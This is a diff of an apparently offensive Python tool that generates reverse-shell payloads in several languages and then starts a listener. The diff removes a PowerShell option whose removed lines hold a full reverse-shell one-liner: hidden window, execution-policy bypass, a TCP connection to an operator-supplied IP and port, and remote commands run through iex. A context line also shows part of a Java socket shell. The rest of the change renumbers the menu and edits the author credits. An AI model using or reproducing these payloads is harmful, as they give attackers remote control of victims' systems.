@@ -30,9 +30,8 @@ choice = input("""
       [12].War
       [13].Lua
       [14].Groovy
-      [15].Powershell
-      [16].C Programming
-      [17].Authours and Contributors 
+      [15].C Programming
+      [16].Authors
       """)
 
 def bash_tcp():
@@ -138,13 +137,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
       print(i,end='')
       sys.stdout.flush()
       sleep(0.03)
-def powershell():
-    #powershell = (""""""
-    #powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""" %(ip,port))
-    for i in powershell:
-      print(i,end='')
-      sys.stdout.flush()
-      sleep(0.03)
 def c():
     c = ("""
 #include <stdio.h>
@@ -180,7 +172,7 @@ int main(){
     print(c)
 def author():
     author = ["K3nX", "Bl@ck_V1rtu@l", "C00l_K3lv1n", "D@ni3l"]
-    print ("All Author and Contributors are \n") 
+    print ("All Author are \n") 
     author = (author[0]+' '+','+' '+ author[1]+' '+','+' '+author[2]+' '+','+' '+author[3]+"\n")
     for i in author:
         print(i,end='')
@@ -242,15 +234,11 @@ def main():
         print("\n")
         listener()
   elif choice == '15':
-       powershell()
-       print("\n")
-       listener()
-  elif choice == '16':
        c()
        print("\n")
        listener()
-  elif choice == '17':
-      author()
+  elif choice == '16':
+       author()
   else:
     print("Pls enter the valid entry")
 if __name__ == "__main__":main()
